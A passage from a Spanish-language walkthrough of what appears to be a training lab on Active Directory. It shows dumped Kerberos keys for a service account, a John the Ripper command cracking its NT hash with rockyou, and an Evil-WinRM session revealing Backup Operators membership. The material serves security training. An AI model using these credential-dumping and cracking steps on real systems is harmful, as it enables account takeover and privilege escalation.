svc_reporting:aes256-cts-hmac-sha1-96:a5ccd3a16117118ad23fd672b9afd7cc656c71b239f8e1edbda01c113e7064e0
svc_reporting:aes128-cts-hmac-sha1-96:42e8bdc95e0f0dc8ba6ef608da287cf2
svc_reporting:des-cbc-md5:0e51795ed62fe01c
svc_reporting:dec-cbc-crc:0e51795ed62fe01c
```

Tenemos el hash NTLM, concretamente el primero.

#### Cracking del hash

```shell-session
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
Repor*********       (?)
```

Tenemos la contraseña en plano del usuario `svc_reporting` que deberíamos incluir en el apartado `Notes > Credentials`

## <mark style="color:purple;">Pregunta 4</mark>

> ¿A qué grupo local poderoso pertenece este usuario?

```powershell
*Evil-WinRM* PS C:\> net user svc_reporting

User name                    svc_reporting
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/8/2022 3:06:39 PM
Password expires             Never
Password changeable          6/9/2022 3:06:39 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Vemos que pertenece al grupo privilegiado Backup Operators.
